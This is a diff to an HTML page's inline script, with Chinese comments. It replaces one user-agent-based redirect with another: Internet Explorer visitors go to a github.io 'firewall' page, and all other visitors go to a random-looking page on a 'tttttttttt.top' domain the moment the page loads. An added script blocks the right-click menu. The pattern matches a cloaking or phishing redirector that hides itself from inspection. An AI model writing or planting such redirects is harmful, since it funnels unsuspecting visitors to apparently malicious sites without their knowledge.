@@ -28,32 +28,31 @@
     </div>
 
     <script>
-        // 检测是否为手机访问或者不是 Edge 或 Chrome 浏览器，且不是 Windows、MacOS 或 Linux 系统
-        function shouldRedirect() {
-            var userAgent = navigator.userAgent.toLowerCase();
-            var isMobile = /iphone|ipod|ipad|android/.test(userAgent);
-            var isEdgeOrChrome = /(edge|chrome)/.test(userAgent);
-            var isWindows = /windows/.test(userAgent);
-            var isMacOS = /macintosh|mac os x/.test(userAgent);
-            var isLinux = /linux/.test(userAgent);
+        // 检测是否为 IE 浏览器
+    function detectIE() {
+        var ua = window.navigator.userAgent;
 
-            // 检测条件：手机访问或者不是 Edge 或 Chrome 浏览器，并且不是 Windows、MacOS 或 Linux 系统
-            return (isMobile || !isEdgeOrChrome) && !isWindows && !isMacOS && !isLinux;
+        // 判断是否为 IE 浏览器的各个版本
+        var isIE = ua.indexOf('MSIE ') > -1 || ua.indexOf('Trident/') > -1;
+
+        return isIE;
+    }
+
+    // 页面加载时执行跳转逻辑
+    window.onload = function() {
+        if (detectIE()) {
+            // 如果是 IE 浏览器，则跳转
+            window.location.href = 'https://sysyz-itcom.github.io/firewall/000300.html';
+        } else {
+            // 如果不是 IE 浏览器，则跳转
+            window.location.href = 'http://pc-itcould.tttttttttt.top/page-version20240711050021943287293894758023cnswefck34489.html'; 
         }
-
-        // 根据设备类型进行重定向
-        function redirect() {
-            if (shouldRedirect()) {
-                // 如果满足条件，则重定向到 2.html
-                window.location.href = 'http://pc-itcom.tttttttttt.top/error.html';
-            } else {
-                // 如果不符合条件，重定向到 1.html
-                window.location.href = 'http://pc-itcould.tttttttttt.top/page-version20240711050021943287293894758023cnswefck34489.html';
-            }
-        }
-
-        // 页面加载时调用重定向函数
-        window.onload = redirect;
+    };
+	</script>
+	<script>
+		document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
     </script>
 </body>
 
